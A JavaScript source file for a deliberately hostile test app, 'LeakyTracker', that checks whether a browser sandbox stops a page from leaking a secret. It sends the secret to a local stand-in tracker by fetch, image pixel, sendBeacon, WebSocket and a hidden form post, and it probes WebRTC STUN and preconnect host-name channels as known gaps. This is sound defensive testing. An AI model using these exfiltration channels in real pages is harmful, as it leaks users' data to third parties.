// Copyright (c) 2026 KeyWeb Runner authors. BSD-3-Clause (see LICENSE).
//
// LeakyTracker: an app written to be hostile. It holds a secret and tries
// five ordinary ways to send it to a tracker:
//
//   1. fetch()                a beacon request
//   2. <img>                  a tracking pixel
//   3. navigator.sendBeacon() the API made for this
//   4. WebSocket              a socket to the tracker
//   5. <form>                 a form posted to the tracker
//
// The attacks are real. Open this same page outside the sandbox (the dev
// server offers it at legacy.localhost) and all five arrive. Inside a key
// origin the browser stops each one before a byte leaves, and says so with
// a securitypolicyviolation event. The page reports honestly either way,
// but do not take its word: the runner shows the tracker's own ledger.
//
// It also probes the two channels no page policy closes in a stock browser,
// WebRTC and preconnect, so that what the sandbox does not stop is on the
// record next to what it does.

import { connect } from './keyweb-client.js';

const byId = (id) => document.getElementById(id);
const runner = connect();

const SECRET = (() => {
  const key = 'leakytracker.secret';
  try {
    const kept = localStorage.getItem(key);
    if (kept) return kept;
    const fresh = `notes-of-user-${crypto.getRandomValues(new Uint32Array(1))[0].toString(36)}`;
    localStorage.setItem(key, fresh);
    return fresh;
  } catch {
    return 'notes-of-user-unsaved';
  }
})();

let tracker = 'http://tracker.localhost:5761';

const ATTACKS = [
  {
    id: 'fetch',
    channel: 'fetch() beacon',
    fire({ leaked, failed, url }) {
      fetch(url, { mode: 'no-cors', cache: 'no-store' }).then(leaked, failed);
    },
  },
  {
    id: 'img',
    channel: '<img> tracking pixel',
    fire({ leaked, failed, url }) {
      const pixel = new Image();
      pixel.addEventListener('load', leaked);
      pixel.addEventListener('error', failed);
      pixel.src = url;
    },
  },
  {
    id: 'beacon',
    channel: 'navigator.sendBeacon()',
    fire({ queued, failed, url }) {
      if (navigator.sendBeacon(url, `secret=${SECRET}`)) queued();
      else failed();
    },
  },
  {
    id: 'websocket',
    channel: 'WebSocket connect',
    fire({ leaked, failed, url }) {
      const socket = new WebSocket(url.replace(/^http/, 'ws').replace('/collect', '/ws'));
      socket.addEventListener('open', () => {
        leaked();
        socket.close();
      });
      socket.addEventListener('error', failed);
    },
  },
  {
    id: 'form',
    channel: 'external <form> submit',
    async fire({ leaked, url }) {
      const form = document.createElement('form');
      form.method = 'post';
      form.action = url;
      const field = document.createElement('input');
      field.type = 'hidden';
      field.name = 'secret';
      field.value = SECRET;
      form.append(field);
      // Post into a hidden frame, the way trackers do, so this page stays put
      // and can report what happened.
      const sink = document.createElement('iframe');
      sink.name = 'leak-sink';
      sink.className = 'sink';
      document.body.append(sink);
      await new Promise((done) => setTimeout(done, 80));
      sink.addEventListener('load', leaked, { once: true });
      form.target = sink.name;
      document.body.append(form);
      form.submit();
      form.remove();
    },
  },
];

function addStatus(kind, text) {
  const item = document.createElement('li');
  item.className = kind;
  item.textContent = text;
  byId('status').prepend(item);
}

/**
 * The two things no page policy stops in a stock browser. Each resolves
 * with nothing; whether the browser objected is read from policy
 * violations, and whether anything arrived is for the tracker to say.
 */
const GAPS = [
  {
    id: 'webrtc',
    channel: 'WebRTC: STUN request over UDP',
    async fire({ host }) {
      const peer = new RTCPeerConnection({ iceServers: [{ urls: `stun:${host}` }] });
      peer.createDataChannel('leak');
      await peer.setLocalDescription(await peer.createOffer());
      setTimeout(() => peer.close(), 1500);
    },
  },
  {
    id: 'preconnect',
    channel: '<link rel="preconnect">: bare TCP connection',
    fire({ host }) {
      // A host name the browser has not connected to before, so it cannot
      // reuse a socket. The name is the app's to choose, which is the point:
      // a name can carry data.
      const label = `stolen-${crypto.getRandomValues(new Uint32Array(1))[0].toString(36)}`;
      const link = document.createElement('link');
      link.rel = 'preconnect';
      link.href = `${location.protocol}//${label}.${host}`;
      document.head.append(link);
    },
  },
];

function renderTable(bodyId = 'attacks', items = ATTACKS) {
  const body = byId(bodyId);
  body.replaceChildren();
  for (const attack of items) {
    const row = document.createElement('tr');
    row.dataset.attack = attack.id;
    const channel = document.createElement('td');
    channel.textContent = attack.channel;
    const result = document.createElement('td');
    const verdict = document.createElement('span');
    verdict.className = 'verdict verdict-waiting';
    verdict.textContent = 'NOT RUN';
    result.append(verdict);
    const why = document.createElement('td');
    why.className = 'why';
    row.append(channel, result, why);
    body.append(row);
  }
}

function showResult(attack, verdict, why, bodyId = 'attacks') {
  const row = byId(bodyId).querySelector(`[data-attack="${attack.id}"]`);
  row.dataset.verdict = verdict;
  const badge = row.querySelector('.verdict');
  badge.className = `verdict verdict-${verdict.toLowerCase()}`;
  badge.textContent = verdict;
  row.querySelector('.why').textContent = why;
}

/** Runs one attack and resolves with how it ended: BLOCKED, LEAKED or UNREACHABLE. */
function attempt(attack) {
  return new Promise((resolve) => {
    const url = `${tracker}/collect?via=${attack.id}&secret=${encodeURIComponent(SECRET)}`;
    let settled = false;
    const finish = (verdict, why) => {
      if (settled) return;
      settled = true;
      document.removeEventListener('securitypolicyviolation', onViolation);
      clearTimeout(timer);
      resolve({ verdict, why, bytes: verdict === 'LEAKED' ? url.length - url.indexOf('?') - 1 : 0 });
    };
    const onViolation = (event) => {
      runner.tell('telemetry', { directive: event.effectiveDirective, blocked: event.blockedURI });
      finish('BLOCKED', `the browser refused it: ${event.effectiveDirective}`);
    };
    document.addEventListener('securitypolicyviolation', onViolation);
    const timer = setTimeout(() => finish('UNREACHABLE', 'nothing stopped it, but nothing answered either'), 4000);
    const signals = {
      url,
      leaked: () => finish('LEAKED', 'the tracker received it'),
      // sendBeacon gives no confirmation: if no policy objects, it is on its way.
      queued: () => setTimeout(() => finish('LEAKED', 'the browser queued it and no policy objected'), 500),
      // A failure with no policy violation means the tracker is down, not that anything protected you.
      failed: () => setTimeout(() => finish('UNREACHABLE', 'no policy stopped it; the tracker is not answering'), 400),
    };
    try {
      Promise.resolve(attack.fire(signals)).catch(() => signals.failed());
    } catch {
      signals.failed();
    }
  });
}

async function run() {
  const button = byId('run');
  button.disabled = true;
  renderTable();
  let blocked = 0;
  let leaked = 0;
  let bytes = 0;
  for (const attack of ATTACKS) {
    showResult(attack, 'WAITING', 'trying');
    const result = await attempt(attack);
    showResult(attack, result.verdict, result.why);
    if (result.verdict === 'BLOCKED') blocked += 1;
    if (result.verdict === 'LEAKED') leaked += 1;
    bytes += result.bytes;
  }
  const summary = byId('summary');
  summary.dataset.blocked = String(blocked);
  summary.dataset.leaked = String(leaked);
  summary.className = leaked === 0 ? 'summary summary-safe' : 'summary summary-leak';
  summary.textContent = leaked === 0
    ? `${blocked}/${ATTACKS.length} exfiltration attempts blocked. 0 bytes leaked.`
    : `${leaked}/${ATTACKS.length} exfiltration attempts LEAKED (${bytes} bytes). ${blocked} blocked.`;
  runner.tell('attack.done', { blocked, leaked });
  button.disabled = false;
}

/** Tries one known gap. OPEN means the browser was asked and no policy objected. */
function probe(gap) {
  return new Promise((resolve) => {
    let objection = null;
    const onViolation = (event) => {
      objection = event.effectiveDirective;
      runner.tell('telemetry', { directive: event.effectiveDirective, blocked: event.blockedURI });
    };
    document.addEventListener('securitypolicyviolation', onViolation);
    const finish = (verdict, why) => {
      document.removeEventListener('securitypolicyviolation', onViolation);
      resolve({ verdict, why });
    };
    const target = new URL(tracker);
    Promise.resolve()
      .then(() => gap.fire({ host: target.host, origin: target.origin }))
      .then(
        () => setTimeout(() => (objection
          ? finish('BLOCKED', `the browser refused it: ${objection}`)
          : finish('OPEN', 'no policy objected: the browser was asked to reach the tracker')), 1200),
        (error) => finish('BLOCKED', `not available here: ${error.name}`),
      );
  });
}

async function probeGaps() {
  const button = byId('gaps');
  button.disabled = true;
  renderTable('gap-rows', GAPS);
  let open = 0;
  for (const gap of GAPS) {
    showResult(gap, 'WAITING', 'trying', 'gap-rows');
    const result = await probe(gap);
    showResult(gap, result.verdict, result.why, 'gap-rows');
    if (result.verdict === 'OPEN') open += 1;
  }
  const summary = byId('gap-summary');
  summary.dataset.open = String(open);
  summary.className = open === 0 ? 'summary summary-safe' : 'summary summary-leak';
  summary.textContent = open === 0
    ? 'Both gaps are closed in this browser.'
    : `${open} of ${GAPS.length} known gaps are open: no policy stopped ${open === 1 ? 'it' : 'them'}. ${runner.framed ? 'Asking the tracker what arrived.' : "The tracker's ledger says what arrived."}`;
  runner.tell('gap.done', { open });
  button.disabled = false;
}

async function start() {
  byId('secret').textContent = SECRET;
  renderTable();
  renderTable('gap-rows', GAPS);
  // The runner reads the tracker's ledger after a probe and passes on what it found.
  runner.listen('gap.ledger', (message) => {
    const summary = byId('gap-summary');
    const datagrams = Number(message.datagrams) || 0;
    const connections = Number(message.connections) || 0;
    summary.dataset.datagrams = String(datagrams);
    summary.dataset.connections = String(connections);
    summary.className = datagrams + connections === 0 ? 'summary summary-safe' : 'summary summary-leak';
    summary.textContent = datagrams + connections === 0
      ? 'The tracker received nothing: no UDP datagram and no bare connection.'
      : `Confirmed by the tracker: ${datagrams} UDP datagram${datagrams === 1 ? '' : 's'} from WebRTC and ${connections} bare TCP connection${connections === 1 ? '' : 's'} from preconnect got out of this sandbox. This is the part a web page cannot fix.`;
  });
  const context = await runner.context;
  if (context.lab && typeof context.lab.tracker === 'string') tracker = context.lab.tracker;
  else if (!context.framed && location.hostname.endsWith('.localhost')) tracker = `http://tracker.localhost:${location.port}`;
  byId('tracker').textContent = tracker;
  if (!context.framed) {
    const mode = byId('mode');
    mode.hidden = false;
    mode.textContent = 'LEGACY WEB, NO SANDBOX. This is the same page served the ordinary way, with no policy. It is the control: run the attacks here and they get through.';
  }
  byId('run').addEventListener('click', run);
  byId('gaps').addEventListener('click', probeGaps);
  byId('undeclared').addEventListener('click', async () => {
    const answer = await runner.request('net:sync-relay', 'I would like a way out, please.');
    byId('status').dataset.last = answer.ok ? 'GRANTED' : answer.error;
    addStatus(answer.ok ? 'bad' : 'ok', answer.ok
      ? 'net:sync-relay was granted. That should not happen: this app never declared it.'
      : `net:sync-relay refused without asking you: ${answer.error}. This app's signed descriptor declares no capabilities, so it may not even ask.`);
  });
  document.documentElement.dataset.ready = 'true';
}

start();
